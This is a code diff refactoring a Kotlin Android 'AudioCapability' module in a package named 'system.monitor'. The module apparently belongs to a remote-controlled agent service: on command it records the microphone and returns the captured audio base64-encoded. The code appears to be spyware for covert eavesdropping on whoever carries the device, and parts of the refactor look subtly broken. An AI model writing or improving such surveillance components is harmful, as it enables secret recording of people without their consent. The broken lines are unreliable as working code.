@@ -1,16 +1,19 @@
 package com.system.monitor.capabilities
 
+import android.content.Context
 import android.media.MediaRecorder
+import android.os.Build
 import android.os.Environment
 import com.google.gson.Gson
 import com.system.monitor.AgentService
 import java.io.File
 import java.io.FileInputStream
+import java.util.concurrent.TimeUnit
 
 class AudioCapability(private val service: AgentService) : AgentService.Capability {
 
-    private var recorder: MediaRecorder? = null
-    private var outputFile: File? = null
+    private var mediaRecorder: MediaRecorder? = null
+    private var recordingFile: File? = null
     private val gson = Gson()
 
     override fun execute(args: String?): Any {
@@ -22,39 +25,50 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
         }
     }
 
+    override fun cleanup() {
+        stopRecording()
+    }
+
     private fun startRecording(duration: Int): Map<String, Any> {
-        if (recorder != null) return mapOf("error" to "already recording")
-        outputFile = File(service.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "rec_${System.currentTimeMillis()}.3gp")
-        recorder = MediaRecorder().apply {
-            setAudioSource(MediaRecorder.AudioSource.MIC)
-            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
-            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-            setOutputFile(outputFile!!.absolutePath)
-            try {
+        if (mediaRecorder != null) {
+            return mapOf("error" to "already_recording")
+        }
+        try {
+            recordingFile = File(service.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "audio_${System.currentTimeMillis()}.3gp")
+            mediaRecorder = MediaRecorder().apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                setOutputFile(recordingFile!!.absolutePath)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                 prepare()
                 start()
-            } catch (e: Exception) {
-                return mapOf("error" to e.message)
             }
+            mapOf("status" to "recording_started", "file" to recordingFile!!.absolutePath)
+        } catch (e: Exception) {
+            mapOf("error" to e.message ?: "recording_failed")
         }
-        thread(name = "audio-stop") {
-            Thread.sleep(duration * 1000L)
-            stopRecording()
-        }
-        return mapOf("status" to "recording")
     }
 
     private fun stopRecording(): Map<String, Any> {
-        recorder?.apply { stop(); release() }
-        recorder = null
-        return outputFile?.let { file ->
+        mediaRecorder?.run {
+            try {
+                stop()
+                release()
+            } catch (e: Exception) {
+                return@run mapOf("error" to e.message ?: "stop_failed")
+            }
+            mediaRecorder = null
+        }
+        val file = recordingFile
+        recordingFile = null
+        return if (file != null && file.exists()) {
             val bytes = file.readBytes()
-            file.delete()
-            mapOf("audio" to android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
-        } ?: mapOf("error" to "no recording")
+            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+            mapOf("status" to "recording_stopped", "audio" to base64, "size" to bytes.size)
+        } else {
+            mapOf("status" to "recording_stopped", "audio" to "")
+        }
     }
-
-    override fun cleanup() { stopRecording() }
 
     data class Params(val action: String, val duration: Int? = null)
 }
